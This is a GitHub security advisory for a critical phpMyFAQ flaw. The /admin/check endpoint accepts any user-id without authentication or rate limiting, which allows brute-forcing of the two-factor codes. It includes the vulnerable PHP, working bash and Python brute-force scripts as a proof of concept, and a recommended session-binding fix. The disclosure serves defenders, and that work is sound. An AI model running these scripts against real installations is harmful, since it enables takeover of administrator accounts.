# [C] phpMyFAQ enables unauthenticated 2FA brute-force attack via /admin/check acceptance of arbitrary user-id

## Summary
Severity: Critical
Advisory: GHSA-9pq7-mfwh-xx2j
CVE: CVE-2026-45010
CWE: CWE-307
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-9pq7-mfwh-xx2j
Type: github-advisory

## Affected
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.1.2
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.1.2

## Details
## Summary

The `/admin/check` endpoint in `AuthenticationController` implements `SkipsAuthenticationCheck`, making it reachable without any prior authentication. An anonymous attacker (Bob) can POST arbitrary `user-id` and `token` values to brute-force any user's 6-digit TOTP code. No rate limiting exists. The 10^6 keyspace is exhaustible in minutes. Reachability confirmed against a default install: unauthenticated `POST /admin/check` with a `user-id` body field returns HTTP 302 to `/admin/token?user-id=<value>`, echoing the attacker-supplied user id without any binding to a prior password-phase authentication.

## Details

**File**: `phpmyfaq/src/phpMyFAQ/Controller/Administration/AuthenticationController.php`, lines 35-36 and 201-228.

The controller class declaration:

```php
final class AuthenticationController extends AbstractAdministrationController implements SkipsAuthenticationCheck
```

The `SkipsAuthenticationCheck` interface (`phpmyfaq/src/phpMyFAQ/Controller/Administration/SkipsAuthenticationCheck.php`) is a marker interface that tells the `ControllerContainerListener` to skip authentication enforcement. Every route in this controller is reachable without a session.

The `check` action (line 201-228):

```php
#[Route(path: '/check', name: 'admin.auth.check', methods: ['POST'])]
public function check(Request $request): RedirectResponse
{
    if ($this->currentUser->isLoggedIn()) {
        return new RedirectResponse(url: './');
    }

    $token = Filter::filterVar($request->request->get(key: 'token'), FILTER_SANITIZE_SPECIAL_CHARS);
    $userId = (int) Filter::filterVar($request->request->get(key: 'user-id'), FILTER_VALIDATE_INT);

    $user = $this->currentUserService;
    $user->getUserById($userId);

    if (strlen((string) $token) === 6) {
        $tfa = $this->twoFactor;
        $result = $tfa->validateToken($token, $userId);

        if ($result) {
            $user->twoFactorSuccess();
            $this->adminLog->log($user, AdminLogType::AUTH_2FA_SUCCESS->value . ':' . $user->getLogin());
            return new RedirectResponse(url: './');
        }

        $this->adminLog->log($user, AdminLogType::AUTH_2FA_FAILED->value . ':' . $user->getLogin());
    }

    return new RedirectResponse('./token?user-id=' . $userId);
}
```

Problems:

1. **No session binding**: The endpoint accepts `user-id` from the POST body. It does not verify that the caller previously authenticated with a password for that user.
2. **No rate limit or lockout**: Failed attempts redirect back to the token form with no counter, delay, or account lock.
3. **Unauthenticated access**: The `SkipsAuthenticationCheck` marker exempts the entire controller from auth enforcement.

The normal login flow (`/admin/authenticate`) redirects to `/admin/token?user-id=X` after a valid password. But nothing prevents Bob from skipping the password step and hitting `/admin/check` directly.

## Proof of Concept

```bash
# Step 1: Identify target user ID (admin is typically user_id=1)
TARGET_HOST="http://target.example"
USER_ID=1

# Step 2: Brute-force the 6-digit TOTP code
# TOTP codes rotate every 30 seconds, giving a window of ~1M attempts per window.
# At 200 req/s this takes under 2 hours worst case; with 2 valid windows it halves.

for code in $(seq -w 000000 999999); do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}:%{redirect_url}" \
    -X POST "${TARGET_HOST}/admin/check" \
    -d "token=${code}&user-id=${USER_ID}")

  # A successful 2FA grants a session and redirects to ./
  # A failure redirects to ./token?user-id=1
  if echo "$RESPONSE" | grep -qv "token?user-id="; then
    echo "[+] Valid TOTP: ${code}"
    break
  fi
done
```

```python
# Faster parallel version
import requests
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://target.example/admin/check"
USER_ID = 1

def try_code(code):
    r = requests.post(TARGET, data={"token": f"{code:06d}", "user-id": USER_ID}, allow_redirects=False)
    location = r.headers.get("Location", "")
    if "token?user-id=" not in location:
        return code
    return None

with ThreadPoolExecutor(max_workers=50) as pool:
    for result in pool.map(try_code, range(1000000)):
        if result is not None:
            print(f"[+] Valid TOTP: {result:06d}")
            break
```

## Impact

Bob bypasses two-factor authentication for any user account (including administrators) without knowing the user's password. After a successful brute-force, `twoFactorSuccess()` grants a fully authenticated admin session. Bob gains full administrative control: user management, FAQ content modification, configuration changes, and access to backup/export functions containing all data.

**CVSS 3.1**: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` (High, 9.1)
**CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)

## Recommended Fix

1. **Bind the 2FA step to a password-verified session**: Store a flag in the server-side session during `authenticate()` indicating the user passed password auth. The `check` action must verify this flag before accepting TOTP attempts.

2. **Add rate limiting / lockout**: After 5 failed TOTP attempts, lock the account or enforce an exponential backoff.

3. **Narrow the SkipsAuthenticationCheck scope**: Move the `/check` and `/token` routes into a separate controller that requires the password-verified session flag rather than blanket-skipping auth.

Example session-binding fix in `check()`:

```php
#[Route(path: '/check', name: 'admin.auth.check', methods: ['POST'])]
public function check(Request $request): RedirectResponse
{
    $userId = (int) Filter::filterVar($request->request->get(key: 'user-id'), FILTER_VALIDATE_INT);

    // Require that the session proves password auth for this specific user
    if ($this->session->get('2fa_pending_user_id') !== $userId) {
        return new RedirectResponse(url: './login');
    }

    // ... existing TOTP validation ...
}
```

And in `authenticate()`, after successful password check:

```php
$this->session->set('2fa_pending_user_id', $this->currentUser->getUserId());
```

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-9pq7-mfwh-xx2j
- https://nvd.nist.gov/vuln/detail/CVE-2026-45010
- https://github.com/thorsten/phpMyFAQ
- https://www.vulncheck.com/advisories/phpmyfaq-unauthenticated-two-factor-authentication-brute-force-via-admin-check-endpoint
